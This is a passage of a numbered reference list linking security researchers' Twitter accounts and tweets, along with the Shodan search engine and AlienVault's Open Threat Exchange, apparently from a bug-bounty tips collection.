`[84]` link: *https://twitter.com/trbughunters/status/1279768631845494787*  
`[85]` @TobiunddasMoe: *https://twitter.com/TobiunddasMoe*  
`[86]` link: *https://twitter.com/TobiunddasMoe/status/1274043016366481409*  
`[87]` @2RS3C: *https://twitter.com/2RS3C*  
`[88]` link: *https://twitter.com/2RS3C/status/1277861125556768769*  
`[89]` Shodan: *https://www.shodan.io/*  
`[90]` @mariusshoratau: *https://twitter.com/mariusshoratau*  
`[91]` link: *https://twitter.com/mariusshoratau/status/1279522645344731138https://twitter.com/mariusshoratau/status/1279522645344731138*  
`[92]` Open Threat Exchange: *https://otx.alienvault.com/*
